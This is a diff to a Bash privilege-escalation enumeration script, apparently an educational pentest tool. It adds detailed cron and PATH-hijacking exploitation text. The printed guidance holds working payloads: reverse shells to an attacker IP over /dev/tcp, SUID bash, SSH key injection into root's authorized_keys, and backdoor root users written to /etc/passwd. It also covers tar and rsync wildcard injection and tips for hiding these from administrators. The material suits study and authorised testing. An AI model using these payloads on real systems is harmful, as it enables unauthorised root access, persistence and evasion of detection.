+                # Only flag if wildcard is used in command context, not in schedule
+                if echo "$line" | awk '{print $6,$7,$8,$9,$10}' | grep -q '\*'; then
+                    echo "$line" >> "$temp_wildcard_jobs"
+                    found_issues=1
                 fi
             fi
-            
-            # Check for wildcards (but exclude safe commands like run-parts)
-            if echo "$line" | grep -qE '\*' && ! echo "$line" | grep -qE 'run-parts'; then
-                warn "Cron job uses wildcards - potential for injection"
-                teach "If command is 'tar -czf backup.tar.gz *', you can:"
-                teach "  touch -- '--checkpoint=1'"
-                teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
-                teach "  When tar runs, it interprets these as arguments"
-            fi
-        done
+        done < <(grep -v "^#" /etc/crontab 2>/dev/null | grep -v "^$")
     fi
     
-    # Check user crontabs
-    for user in $(cut -d: -f1 /etc/passwd); do
-        crontab -l -u "$user" 2>/dev/null | grep -v "^#" | grep -v "^$" | while read line; do
-            info "User $user cron: $line"
-        done
-    done
-    
-    # Check cron directories
+    # Check cron directories for writable files and directories
     for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
         if [ -w "$dir" ]; then
-            critical "Cron directory WRITABLE: $dir - Place malicious cron job"
-            vuln "Cron directory is WRITABLE: $dir"
-            teach "Create malicious cron job in this directory"
+            echo "$dir|directory" >> "$temp_writable_files"
+            found_issues=1
         fi
         
         if [ -d "$dir" ]; then
-            find "$dir" -type f -writable 2>/dev/null | while read file; do
-                critical "Writable cron file: $file"
-                vuln "Writable cron file: $file"
-            done
+            while IFS= read -r file; do
+                if [ -w "$file" ]; then
+                    echo "$file|file" >> "$temp_writable_files"
+                    found_issues=1
+                fi
+            done < <(find "$dir" -type f 2>/dev/null)
         fi
     done
+    
+    # Check user crontabs (if accessible)
+    if [ -d /var/spool/cron/crontabs ]; then
+        while IFS= read -r cronfile; do
+            [ ! -r "$cronfile" ] && continue
+            
+            while IFS= read -r line; do
+                echo "$line" | grep -qE "^#|^$" && continue
+                
+                local scripts=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb|php|bash)')
+                for script in $scripts; do
+                    if [ -w "$script" ]; then
+                        echo "$script|$line|$(basename "$cronfile")" >> "$temp_writable_scripts"
+                        found_issues=1
+                    fi
+                done
+            done < <(grep -v "^#" "$cronfile" 2>/dev/null | grep -v "^$")
+        done < <(find /var/spool/cron/crontabs -type f 2>/dev/null)
+    fi
+    
+    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
+    if [ $found_issues -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  CRON EXPLOITATION - Understanding Scheduled Tasks"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "HOW CRON WORKS:"
+        teach "  Cron daemon (crond) runs as root, checking schedules every minute"
+        teach "  Reads: /etc/crontab, /etc/cron.d/*, user crontabs"
+        teach "  Executes commands at scheduled times as specified user"
+        teach ""
+        teach "TYPICAL CRON ENTRY:"
+        teach "  */5 * * * * root /usr/local/bin/backup.sh"
+        teach "  │   │ │ │ │  │    └─ Command to execute"
+        teach "  │   │ │ │ │  └─ User to run as (root = danger!)"
+        teach "  └───┴─┴─┴─┴─ Schedule (* = every)"
+        teach "  min hr dom mon dow"
+        teach ""
+        teach "WHY ADMINS CREATE VULNERABILITIES:"
+        teach ""
+        teach "  Scenario 1 - The Quick Fix:"
+        teach "    Admin needs automated backup script"
+        teach "    Creates /usr/local/bin/backup.sh with 755 permissions"
+        teach "    Adds to root's crontab"
+        teach "    Thinks: 'Only root runs it, so it's safe'"
+        teach "    Reality: File is world-writable or in writable directory"
+        teach "    → You modify script, cron runs YOUR code as root"
+        teach ""
+        teach "  Scenario 2 - The Wildcard Mistake:"
+        teach "    Admin writes: tar -czf backup.tar.gz /data/*"
+        teach "    Thinks: '* means all files in /data'"
+        teach "    Reality: Shell expands * to filenames BEFORE tar runs"
+        teach "    → You create files named '--checkpoint-action=exec=shell.sh'"
+        teach "    → Tar interprets these as arguments, executes your code"
+        teach ""
+        teach "THE TIMING WINDOW:"
+        teach "  Cron runs every minute"
+        teach "  You inject payload → Wait up to 60 seconds → Root shell"
+        teach "  Some jobs run every 5 minutes, hourly, or daily"
+        teach "  Check the schedule field to know when it'll trigger"
+        teach ""
+        teach "EXPLOITATION PATHS:"
+        teach "  1. Writable script → Inject malicious commands"
+        teach "  2. Writable directory → Replace script with yours"
+        teach "  3. Wildcard injection → Create malicious filenames"
+        teach "  4. Writable cron config → Create new scheduled jobs"
+        log ""
+    fi
+    
+    # === PHASE 3: REPORT WRITABLE SCRIPTS ===
+    if [ -f "$temp_writable_scripts" ]; then
+        while IFS='|' read -r script job user; do
+            critical "WRITABLE cron script: $script"
+            vuln "Cron job: $job"
+            if [ -n "$user" ]; then
+                info "User crontab: $user"
+            fi
+            log ""
+            teach "╔═══════════════════════════════════════════════════════════╗"
+            teach "║  WRITABLE SCRIPT EXPLOITATION"
+            teach "╚═══════════════════════════════════════════════════════════"
+            teach ""
+            teach "WHAT YOU CONTROL:"
+            teach "  The script file itself is writable by you"
+            teach "  Cron will execute whatever code you put in it as root"
+            teach "  This is instant root access on next execution"
+            teach ""
+            teach "EXPLOITATION OPTIONS:"
+            teach ""
+            teach "  Method 1 - SUID Shell (Stealthy):"
+            teach "    echo 'chmod u+s /bin/bash' >> $script"
+            teach "    # Wait for cron to run (check schedule in crontab)"
+            teach "    /bin/bash -p  # You now have root shell"
+            teach ""
+            teach "  Method 2 - Reverse Shell (Immediate notification):"
+            teach "    echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> $script"
+            teach "    # On attacker machine: nc -lvnp 4444"
+            teach "    # Wait for cron execution"
+            teach ""
+            teach "  Method 3 - SSH Key Injection (Persistent access):"
+            teach "    cat >> $script << 'EOF'"
+            teach "    mkdir -p /root/.ssh"
+            teach "    echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys"
+            teach "    chmod 700 /root/.ssh"
+            teach "    chmod 600 /root/.ssh/authorized_keys"
+            teach "    EOF"
+            teach "    # After cron runs: ssh -i your_key root@target"
+            teach ""
+            teach "  Method 4 - Add Backdoor User:"
+            teach "    # Generate password hash: openssl passwd -1 -salt xyz password123"
+            teach "    echo 'echo \"backdoor:\$1\$xyz\$HASH:0:0::/root:/bin/bash\" >> /etc/passwd' >> $script"
+            teach "    # After cron: su backdoor"
+            teach ""
+            teach "STEALTH CONSIDERATIONS:"
+            teach "  • Append (>>) instead of overwrite (>) to keep original functionality"
+            teach "  • Check script file size before/after to avoid suspicion"
+            teach "  • Remove your payload after execution: echo 'sed -i \"/YOUR_LINE/d\" $script' >> $script"
+            teach "  • Some scripts have checksums - check for integrity monitoring"
+            log ""
+        done < "$temp_writable_scripts"
+    fi
+    
+    # === PHASE 4: REPORT WRITABLE DIRECTORIES ===
+    if [ -f "$temp_writable_dirs" ]; then
+        while IFS='|' read -r script job dir; do
+            critical "Cron script in WRITABLE directory: $dir"
+            vuln "Script: $script"
+            vuln "Cron job: $job"
+            log ""
+            teach "╔═══════════════════════════════════════════════════════════╗"
+            teach "║  WRITABLE DIRECTORY EXPLOITATION"
+            teach "╚═══════════════════════════════════════════════════════════"
+            teach ""
+            teach "WHAT YOU CONTROL:"
+            teach "  The directory containing the script is writable"
+            teach "  You can delete the script and replace it with yours"
+            teach "  Or create a symlink to your malicious script"
+            teach ""
+            teach "WHY THIS WORKS:"
+            teach "  Cron doesn't verify script integrity, only that path exists"
+            teach "  Directory write permission = full control over that path"
+            teach ""
+            teach "EXPLOITATION:"
+            teach ""
+            teach "  Step 1 - Backup original (optional, for stealth):"
+            teach "    cp $script ${script}.bak"
+            teach ""
+            teach "  Step 2 - Replace with malicious script:"
+            teach "    cat > $script << 'EOF'"
+            teach "    #!/bin/bash"
+            teach "    chmod u+s /bin/bash"
+            teach "    # Optional: Call original to avoid suspicion"
+            teach "    # ${script}.bak \"\$@\""
+            teach "    EOF"
+            teach ""
+            teach "  Step 3 - Ensure executable:"
+            teach "    chmod +x $script"
+            teach ""
+            teach "  Step 4 - Wait for cron execution"
+            teach "    Check crontab for schedule (*/5 = every 5 min)"
+            teach ""
+            teach "  Step 5 - Execute SUID bash:"
+            teach "    /bin/bash -p"
+            teach ""
+            teach "ALTERNATIVE - Symlink Method:"
+            teach "  mv $script ${script}.real"
+            teach "  ln -s /path/to/your/evil/script $script"
+            teach "  # Cron follows symlink, executes your script as root"
+            log ""
+        done < "$temp_writable_dirs"
+    fi
+    
+    # === PHASE 5: REPORT WILDCARD JOBS ===
+    if [ -f "$temp_wildcard_jobs" ]; then
+        warn "Cron jobs using wildcards detected"
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  WILDCARD INJECTION - Advanced Technique"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "HOW WILDCARD EXPANSION WORKS:"
+        teach ""
+        teach "  Shell processes wildcards BEFORE passing to command"
+        teach ""
+        teach "  Example cron job:"
+        teach "    tar -czf backup.tar.gz /data/*"
+        teach ""
+        teach "  Files in /data/:"
+        teach "    file1.txt"
+        teach "    file2.txt"
+        teach ""
+        teach "  Shell expands to:"
+        teach "    tar -czf backup.tar.gz /data/file1.txt /data/file2.txt"
+        teach ""
+        teach "THE ATTACK:"
+        teach ""
+        teach "  You create files with names that look like command flags:"
+        teach "    cd /data"
+        teach "    touch -- '--checkpoint=1'"
+        teach "    touch -- '--checkpoint-action=exec=sh shell.sh'"
+        teach ""
+        teach "  Now shell expands to:"
+        teach "    tar -czf backup.tar.gz /data/--checkpoint=1 /data/--checkpoint-action=exec=sh shell.sh /data/file1.txt"
+        teach ""
+        teach "  Tar interprets '--checkpoint-action' as an OPTION, not a filename!"
+        teach "  Tar's --checkpoint-action flag executes shell commands"
+        teach "  Result: Tar executes shell.sh as root"
+        teach ""
+        teach "WHY THIS WORKS:"
+        teach "  Commands process options (flags starting with -) before filenames"
+        teach "  There's no way for tar to distinguish between:"
+        teach "    - A file named '--checkpoint=1'"
+        teach "    - An actual --checkpoint=1 flag"
+        teach "  Shell has already expanded * by the time tar runs"
+        teach ""
+        
+        while IFS= read -r job; do
+            vuln "Wildcard job: $job"
+        done < "$temp_wildcard_jobs"
+        
+        log ""
+        teach "EXPLOITATION STEPS:"
+        teach ""
+        teach "  1. Identify the working directory from cron job"
+        teach "     (Look at the path before the *)"
+        teach ""
+        teach "  2. Create your malicious payload script:"
+        teach "     cat > /tmp/shell.sh << 'EOF'"
+        teach "     #!/bin/bash"
+        teach "     chmod u+s /bin/bash"
+        teach "     EOF"
+        teach "     chmod +x /tmp/shell.sh"
+        teach ""
+        teach "  3. Navigate to wildcard directory:"
+        teach "     cd /target/directory"
+        teach ""
+        teach "  4. Create checkpoint files (note the -- to prevent flag interpretation):"
+        teach "     touch -- '--checkpoint=1'"
+        teach "     touch -- '--checkpoint-action=exec=sh /tmp/shell.sh'"
+        teach ""
+        teach "  5. Wait for cron to run"
+        teach ""
+        teach "  6. Execute SUID bash:"
+        teach "     /bin/bash -p"
+        teach ""
+        teach "OTHER VULNERABLE COMMANDS:"
+        teach "  • rsync with *: Use -e flag"
+        teach "    touch -- '-e sh shell.sh x'"
+        teach ""
+        teach "  • chown with *: Use --reference flag"
+        teach "    touch -- '--reference=/root/owned_file'"
+        teach ""
+        teach "  • chmod with *: Use --reference flag"
+        teach ""
+        teach "KEY INSIGHT:"
+        teach "  Any command that accepts flags starting with - or --"
+        teach "  and processes * wildcards is potentially vulnerable"
+        log ""
+    fi
+    
+    # === PHASE 6: REPORT WRITABLE CRON FILES ===
+    if [ -f "$temp_writable_files" ]; then
+        while IFS='|' read -r file type; do
+            critical "WRITABLE cron configuration: $file"
+            vuln "Type: $type"
+            log ""
+            teach "╔═══════════════════════════════════════════════════════════╗"
+            teach "║  WRITABLE CRON CONFIGURATION"
+            teach "╚═══════════════════════════════════════════════════════════"
+            teach ""
+            teach "DIRECT CRON JOB CREATION:"
+            teach "  You can create or modify cron jobs directly"
+            teach "  This is the easiest path - no script analysis needed"
+            teach ""
+            teach "EXPLOITATION:"
+            teach ""
+            if [ "$type" = "directory" ]; then
+                teach "  Directory is writable - create new cron file:"
+                teach "    echo '* * * * * root chmod u+s /bin/bash' > $file/pwn"
+                teach "    # Runs every minute"
+                teach "    # Wait up to 60 seconds"
+                teach "    /bin/bash -p"
+            else
+                teach "  File is writable - add job directly:"
+                teach "    echo '* * * * * root chmod u+s /bin/bash' >> $file"
+                teach "    # Runs every minute"
+                teach "    # Wait up to 60 seconds"  
+                teach "    /bin/bash -p"
+            fi
+            teach ""
+            teach "ALTERNATIVE PAYLOADS:"
+            teach ""
+            teach "  Reverse shell:"
+            teach "    echo '* * * * * root bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > $file"
+            teach ""
+            teach "  SSH key injection:"
+            teach "    echo '* * * * * root echo YOUR_KEY >> /root/.ssh/authorized_keys' > $file"
+            teach ""
+            teach "  Add backdoor user:"
+            teach "    echo '* * * * * root echo \"pwn:\\$1\\$xyz\\$HASH:0:0::/root:/bin/bash\" >> /etc/passwd' > $file"
+            log ""
+        done < "$temp_writable_files"
+    fi
+    
+    # === PHASE 7: CLEAN EXIT ===
+    if [ $found_issues -eq 0 ]; then
+        ok "No exploitable cron configurations found"
+    fi
 }
 
 # === KERNEL EXPLOITS ===
@@ -3493,44 +4188,112 @@ enum_kernel() {
     info "For comprehensive kernel exploit search, use the tools above"
     log ""
 }
-# === PATH HIJACKING ===
+# === PATH HIJACKING OPPORTUNITIES ===
 enum_path() {
     section "PATH HIJACKING OPPORTUNITIES"
     
     explain_concept "PATH Hijacking" \
         "Programs can call commands using relative paths (e.g., 'ls' instead of '/bin/ls'). The shell searches \$PATH directories in order. If you control an early PATH directory, you control what gets executed." \
         "Lazy coding + SUID binaries = exploitable. Admins write scripts that call 'cat' or 'whoami' without full paths. If that script is SUID or run by cron as root, and you can create a malicious binary earlier in PATH, you win." \
-        "Steps:\n  1. Find writable directory in PATH\n  2. Identify SUID binary that calls relative commands: strings /path/to/suid | grep -v '/'\n  3. Create malicious version: echo '/bin/sh' > /writable/path/command; chmod +x\n  4. Execute SUID binary"
+        "Steps:\n  1. Find writable directory in PATH\n  2. Identify SUID binary that calls relative commands\n  3. Create malicious version in writable PATH dir\n  4. Execute SUID binary"
     
-    local writable_path=0
+    local current_path="$PATH"
+    local has_issues=0
     
-    info "Current PATH: $PATH"
+    info "Current PATH: $current_path"
     
-    echo "$PATH" | tr ':' '\n' | while read dir; do
-        if [ -w "$dir" ]; then
-            critical "Writable PATH directory: $dir - Hijack commands for privilege escalation"
-            vuln "Writable directory in PATH: $dir"
-            writable_path=1
-            teach "You can create fake binaries here. They'll be executed by:"
-            teach "  • SUID binaries calling system commands"
-            teach "  • Sudo commands using relative paths"
-            teach "  • Root cron jobs with simple PATH"
-            teach "  • Other users' scripts"
-            
-            teach "Common targets to hijack: ls, cat, whoami, id, ps, netstat"
+    # First pass - check if there are any issues
+    while IFS=: read -r dir; do
+        [ -z "$dir" ] && continue
+        if [ "$dir" = "." ]; then
+            has_issues=1
+            break
         fi
-    done
+        if [ -d "$dir" ] && [ -w "$dir" ]; then
+            has_issues=1
+            break
+        fi
+    done <<< "$current_path"
     
-    [ $writable_path -eq 0 ] && ok "No writable directories in PATH"
+    # Only show education if we found issues
+    if [ $has_issues -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  PATH HIJACKING - Understanding Command Resolution"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "HOW SHELL FINDS COMMANDS:"
+        teach "  You type: ls"
+        teach "  Shell searches PATH left-to-right:"
+        teach "  /usr/local/bin/ls → /usr/bin/ls → /bin/ls"
+        teach "  First match wins, stops searching"
+        teach ""
+        teach "EXPLOITATION:"
+        teach "  If writable directory comes before real binary:"
+        teach "  PATH=/tmp:/usr/bin  ← /tmp writable, comes first"
+        teach "  Create: /tmp/ls (malicious)"
+        teach "  Victim runs 'ls' → executes /tmp/ls as root"
+        teach ""
+        teach "WHY SUID BINARIES MATTER:"
+        teach "  Bad: system(\"ls\")     ← Searches PATH"
+        teach "  Good: execve(\"/bin/ls\") ← Absolute path"
+        teach ""
+        teach "CURRENT DIRECTORY (.) IN PATH:"
+        teach "  Extremely dangerous - ANY directory becomes executable"
+        teach "  Admin: cd /tmp && sudo script.sh"
+        teach "  Your /tmp/command executes as root"
+        log ""
+    fi
     
-    # Check if current directory is in PATH
-    if echo "$PATH" | grep -qE '(^|:)\.(:$|$)'; then
-        critical "Current directory (.) in PATH - Extreme hijacking risk"
-        vuln "Current directory (.) is in PATH!"
-        teach "Extremely dangerous - any command can be hijacked"
+    # Enumerate and report issues
+    local writable_count=0
+    local has_current_dir=0
+    
+    while IFS=: read -r dir; do
+        [ -z "$dir" ] && continue
+        
+        if [ "$dir" = "." ]; then
+            critical "CURRENT DIRECTORY (.) IN PATH"
+            has_current_dir=1
+            log ""
+            teach "EXPLOITATION:"
+            teach "  $ cd /tmp"
+            teach "  $ cat > ls << 'EOF'"
+            teach "  #!/bin/bash"
+            teach "  chmod u+s /bin/bash"
+            teach "  /bin/ls \"\$@\"  # Call real ls"
+            teach "  EOF"
+            teach "  $ chmod +x ls"
+            teach "  $ # Wait for root to run command calling 'ls'"
+            teach "  $ /bin/bash -p  # Root shell"
+            log ""
+            writable_count=$((writable_count + 1))
+            
+        elif [ -d "$dir" ] && [ -w "$dir" ]; then
+            critical "WRITABLE PATH directory: $dir"
+            log ""
+            teach "EXPLOITATION:"
+            teach "  Create malicious binary matching common command:"
+            teach "  $ cat > $dir/whoami << 'EOF'"
+            teach "  #!/bin/bash"
+            teach "  chmod u+s /bin/bash"
+            teach "  /usr/bin/whoami \"\$@\""
+            teach "  EOF"
+            teach "  $ chmod +x $dir/whoami"
+            teach ""
+            teach "  Find targets:"
+            teach "  find / -perm -4000 2>/dev/null | while read f; do"
+            teach "    strings \"\$f\" | grep -v '/' | grep '^[a-z]\\+\$'"
+            teach "  done | sort -u"
+            log ""
+            writable_count=$((writable_count + 1))
+        fi
+    done <<< "$current_path"
+    
+    if [ $writable_count -eq 0 ] && [ $has_current_dir -eq 0 ]; then
+        ok "No writable directories in PATH"
     fi
 }
-
 # === SPECIAL GROUPS ===
 enum_groups() {
     section "PRIVILEGED GROUP MEMBERSHIP"
